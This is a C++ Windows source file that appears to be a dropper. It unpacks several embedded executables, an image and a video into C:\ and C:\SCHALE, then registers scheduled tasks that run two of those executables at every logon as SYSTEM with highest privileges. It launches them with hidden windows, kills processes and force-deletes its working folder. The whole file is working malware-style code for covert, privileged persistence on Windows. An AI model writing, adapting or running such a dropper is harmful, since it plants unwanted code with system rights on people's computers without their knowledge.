#include <Windows.h>
#include <string>
#include "resource.h"

#pragma comment(linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"")

BOOL RF(DWORD dwResName, LPCSTR lpResType, LPCSTR lpFilePathName)
{
	HMODULE hInstance = GetModuleHandle(NULL);
	HRSRC hResID = FindResource(hInstance, MAKEINTRESOURCE(dwResName), lpResType);
	HGLOBAL hRes = LoadResource(hInstance, hResID);
	LPVOID pRes = LockResource(hRes);

	if (pRes == NULL)
	{
		return FALSE;
	}

	DWORD dwResSize = SizeofResource(hInstance, hResID);
	HANDLE hResFile = CreateFile(lpFilePathName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	if (INVALID_HANDLE_VALUE == hResFile)
	{
		return FALSE;
	}

	DWORD dwWritten = 0;
	WriteFile(hResFile, pRes, dwResSize, &dwWritten, NULL);
	CloseHandle(hResFile);
	return (dwResSize == dwWritten);
}

void STARTSCHALE()
{
	std::string SCHALE = "C:\\SCHALE";
	CreateDirectory(SCHALE.c_str(), NULL);

	RF(IDB_PNG1, "PNG", "C:\\SCHALE\\BA.png");
	RF(IDR_MP41, "MP4", "C:\\SCHALE.mp4");
	RF(IDR_EXE1, "EXE", "C:\\ffplay.exe");
	RF(IDR_EXE2, "EXE", "C:\\S.C.H.A.L.E.exe");
	RF(IDR_EXE3, "EXE", "C:\\SCHALE\\SCHALECLEANUP.exe");
	RF(IDR_EXE4, "EXE", "C:\\SCHALE\\SCHALEGUI.exe");
	RF(IDR_EXE5, "EXE", "C:\\SCHALEWALLPAPER.exe");

	system("schtasks /create /tn \"SCHALE\" /tr C:\\S.C.H.A.L.E.exe /sc onlogon /ru \"System\" /rl HIGHEST /f");
	system("schtasks /run \"SCHALE\"");
	system("schtasks /create /tn \"SCHALEWALLPAPER\" /tr C:\\SCHALEWALLPAPER.exe /sc onlogon /ru \"System\" /rl HIGHEST /f");
	system("schtasks /run \"SCHALEWALLPAPER\"");

	ShellExecute(NULL, "open", "C:\\S.C.H.A.L.E.exe", NULL, NULL, SW_HIDE);
	ShellExecute(NULL, "open", "C:\\SCHALE\\SCHALEGUI.exe", NULL, NULL, SW_HIDE);
	Sleep(3000);

	ShellExecute(NULL, "open", "C:\\SCHALEWALLPAPER.exe", NULL, NULL, SW_HIDE);
	system("taskkill /f /im SCHALEGUI.exe");
	Sleep(10000);

	ShellExecute(NULL, "open", "C:\\SCHALE\\SCHALECLEANUP.exe", NULL, NULL, SW_HIDE);
	Sleep(10000);

	system("taskkill /f /im ffplay.exe");
	system("del /f /s /q C:\\SCHALE");
	system("rd C:\\SCHALE");
}

int main()
{
	STARTSCHALE();
}